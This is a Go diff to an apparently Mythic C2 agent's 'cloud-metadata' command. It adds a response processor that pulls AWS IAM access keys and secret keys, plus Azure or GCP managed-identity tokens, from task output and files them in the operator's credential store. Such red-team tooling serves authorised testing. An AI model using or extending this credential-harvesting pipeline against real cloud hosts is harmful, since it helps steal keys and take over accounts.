@@ -2,8 +2,10 @@ package agentfunctions
 
 import (
 	"fmt"
+	"strings"
 
 	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
+	"github.com/MythicMeta/MythicContainer/mythicrpc"
 )
 
 func init() {
@@ -72,6 +74,77 @@ func init() {
 		},
 		TaskFunctionParseArgDictionary: func(args *agentstructs.PTTaskMessageArgsData, input map[string]interface{}) error {
 			return args.LoadArgsFromDictionary(input)
+		},
+		TaskFunctionProcessResponse: func(processResponse agentstructs.PtTaskProcessResponseMessage) agentstructs.PTTaskProcessResponseMessageResponse {
+			response := agentstructs.PTTaskProcessResponseMessageResponse{
+				TaskID:  processResponse.TaskData.Task.ID,
+				Success: true,
+			}
+			responseText, ok := processResponse.Response.(string)
+			if !ok || responseText == "" {
+				return response
+			}
+			hostname := processResponse.TaskData.Callback.Host
+			var creds []mythicrpc.MythicRPCCredentialCreateCredentialData
+
+			// Extract AWS access keys if present
+			if strings.Contains(responseText, "AccessKeyId") {
+				lines := strings.Split(responseText, "\n")
+				var accessKey, secretKey, roleName string
+				for _, line := range lines {
+					line = strings.TrimSpace(line)
+					if strings.HasPrefix(line, "AccessKeyId:") {
+						accessKey = strings.TrimSpace(strings.TrimPrefix(line, "AccessKeyId:"))
+					} else if strings.HasPrefix(line, "SecretAccessKey:") {
+						secretKey = strings.TrimSpace(strings.TrimPrefix(line, "SecretAccessKey:"))
+					} else if strings.HasPrefix(line, "[+] AWS IAM Role:") {
+						roleName = strings.TrimSpace(strings.TrimPrefix(line, "[+] AWS IAM Role:"))
+					}
+				}
+				if accessKey != "" && secretKey != "" {
+					account := "AWS IAM"
+					if roleName != "" {
+						account = fmt.Sprintf("AWS IAM (%s)", roleName)
+					}
+					creds = append(creds, mythicrpc.MythicRPCCredentialCreateCredentialData{
+						CredentialType: "key",
+						Realm:          hostname,
+						Account:        account,
+						Credential:     fmt.Sprintf("AccessKeyId=%s SecretAccessKey=%s", accessKey, secretKey),
+						Comment:        "cloud-metadata (AWS IAM)",
+					})
+				}
+			}
+
+			// Extract Azure/GCP tokens if present
+			if strings.Contains(responseText, "access_token") {
+				lines := strings.Split(responseText, "\n")
+				for _, line := range lines {
+					line = strings.TrimSpace(line)
+					if strings.HasPrefix(line, "access_token:") || strings.HasPrefix(line, "Token:") {
+						token := strings.TrimSpace(strings.SplitN(line, ":", 2)[1])
+						if len(token) > 10 {
+							provider := "Cloud"
+							if strings.Contains(responseText, "Azure") {
+								provider = "Azure"
+							} else if strings.Contains(responseText, "GCP") || strings.Contains(responseText, "google") {
+								provider = "GCP"
+							}
+							creds = append(creds, mythicrpc.MythicRPCCredentialCreateCredentialData{
+								CredentialType: "token",
+								Realm:          hostname,
+								Account:        fmt.Sprintf("%s Managed Identity", provider),
+								Credential:     token,
+								Comment:        fmt.Sprintf("cloud-metadata (%s token)", provider),
+							})
+							break // Only capture first token
+						}
+					}
+				}
+			}
+
+			registerCredentials(processResponse.TaskData.Task.ID, creds)
+			return response
 		},
 		TaskFunctionCreateTasking: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskCreateTaskingMessageResponse {
 			response := agentstructs.PTTaskCreateTaskingMessageResponse{
